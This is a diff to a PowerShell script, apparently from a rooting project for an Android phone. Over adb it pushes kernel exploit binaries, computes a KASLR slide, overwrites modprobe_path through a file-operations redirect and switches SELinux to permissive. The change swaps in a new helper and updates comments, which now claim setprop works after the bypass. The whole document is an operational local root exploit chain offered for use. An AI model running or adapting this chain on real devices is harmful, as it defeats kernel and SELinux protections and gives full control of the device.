@@ -11,11 +11,11 @@
 #     bytes ("????") the kernel's search_binary_handler() skips request_module()
 #     entirely and no helper is spawned.
 #   * Arm /data/local/tmp/rcmd BEFORE triggering: the helper daemon polls rcmd.
-#   * The root you get is uid 0 with SELinux context u:r:kernel:s0. It can read
-#     kernel memory and touch files whose fscrypt key is already cached, but
-#     SELinux (always-enforcing for property_service / init) BLOCKS `setprop` and
-#     `settings`. So vn_volte.sh will likely report "Failed to set property".
-#     See docs/KSU_ROOT_FINDINGS.md for the confinement finding.
+#   * The root is uid 0 with SELinux context u:r:kernel:s0. The exploit now also
+#     marks the kernel domain permissive in the loaded policy and the helper
+#     (mpnl) syncs user-space SELinux to permissive, so `setprop` DOES work from
+#     this domain. `settings` remains blocked by DEFEX. See
+#     docs/SELINUX_USERSYNC.md.
 #
 # Usage:  powershell -ExecutionPolicy Bypass -File scripts\enable_vn.ps1
 param(
@@ -49,9 +49,9 @@ function Ensure($dev, $src) {
 }
 Ensure "/data/local/tmp/glA21"       "glA21_a64"
 Ensure "/data/local/tmp/dnroot"      "glA21_dnroot_a64"
-Ensure "/data/local/tmp/mphelper"    "mphelper"
+Ensure "/data/local/tmp/mpnl"        "glA21_mpnl_a64"
 Ensure "/data/local/tmp/vn_volte.sh" "scripts/vn_volte.sh"
-Sh "chmod 755 /data/local/tmp/glA21 /data/local/tmp/dnroot /data/local/tmp/mphelper /data/local/tmp/vn_volte.sh 2>/dev/null" | Out-Null
+Sh "chmod 755 /data/local/tmp/glA21 /data/local/tmp/dnroot /data/local/tmp/mpnl /data/local/tmp/vn_volte.sh 2>/dev/null" | Out-Null
 
 # trigger file: 4 x 0xFF (non-printable magic -> request_module("binfmt-ffff"))
 $pwn = Join-Path $env:TEMP "ghostlock_pwn2"
@@ -81,8 +81,8 @@ Info "      dominant IP = $sel  ->  SLIDE = $slideHex"
 
 # --- 4/6 fops redirect + write modprobe_path + SELinux off ---
 Info "[4/6] exploit (fops redirect -> modprobe_path + selinux off)..."
-$run = (Sh "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=$slideHex MP_PATH=/data/local/tmp/mphelper timeout 150 /data/local/tmp/glA21 --stop-after=verify --log=info") -join "`n"
-($run -split "`n") | Where-Object { $_ -match 'modprobe_path|STOP_VERIFY|ONLY_FOPS|pselect route done|FAIL' } | ForEach-Object { Info "      $_" }
+$run = (Sh "env SSOPT_EMPTY=1 SSOPT_FAKE_TASK=1 SSOPT_OWNER0=0 PSELECT_ROUTE_DELAY_USEC=0 ROUTE_SETSOCKOPT=1 FORCE_REDIRECT=1 SLIDE=$slideHex MP_PATH=/data/local/tmp/mpnl timeout 150 /data/local/tmp/glA21 --stop-after=verify --log=info") -join "`n"
+($run -split "`n") | Where-Object { $_ -match 'modprobe_path|permissive_map|STOP_VERIFY|ONLY_FOPS|pselect route done|FAIL' } | ForEach-Object { Info "      $_" }
 if ($run -notmatch 'selinux_off=1') {
   Write-Host "      (warn) selinux_off=1 not seen -> walk failed this attempt; re-run (slide varies per boot)." -ForegroundColor Yellow
   exit 2
